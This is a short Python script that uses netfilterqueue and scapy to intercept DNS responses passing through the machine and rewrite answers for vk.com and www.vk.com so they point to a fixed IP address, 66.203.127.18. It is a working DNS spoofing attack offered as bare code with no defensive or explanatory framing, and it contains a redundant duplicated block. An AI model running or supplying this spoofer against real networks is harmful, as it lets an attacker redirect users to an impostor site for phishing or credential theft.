import netfilterqueue
import scapy.all as scapy

def detail_pkt(packet):
	scapy_pkt = scapy.IP(packet.get_payload())

	if scapy_pkt.haslayer(scapy.DNSRR):
		qname = scapy_pkt[scapy.DNSQR].qname

		if b'www.vk.com' in qname:
			print('inject fake vk.com')
			ans = scapy.DNSRR(rrname = qname, rdata = '66.203.127.18')

			scapy_pkt[scapy.DNS].an = ans
			scapy_pkt[scapy.DNS].ancount = 1

			del scapy_pkt[scapy.IP].len
			del scapy_pkt[scapy.IP].chksum
			del scapy_pkt[scapy.UDP].len
			del scapy_pkt[scapy.UDP].chksum

			packet.set_payload(bytes(scapy_pkt))

		if b'vk.com' in qname:
			print('inject fake vk.com')
			ans = scapy.DNSRR(rrname = qname, rdata = '66.203.127.18')

			scapy_pkt[scapy.DNS].an = ans
			scapy_pkt[scapy.DNS].ancount = 1

			del scapy_pkt[scapy.IP].len
			del scapy_pkt[scapy.IP].chksum
			del scapy_pkt[scapy.UDP].len
			del scapy_pkt[scapy.UDP].chksum

			packet.set_payload(bytes(scapy_pkt))

		#print(scapy_pkt.show())

	#packet.drop()
	packet.accept()

q = netfilterqueue.NetfilterQueue()
q.bind(0, detail_pkt)
q.run()
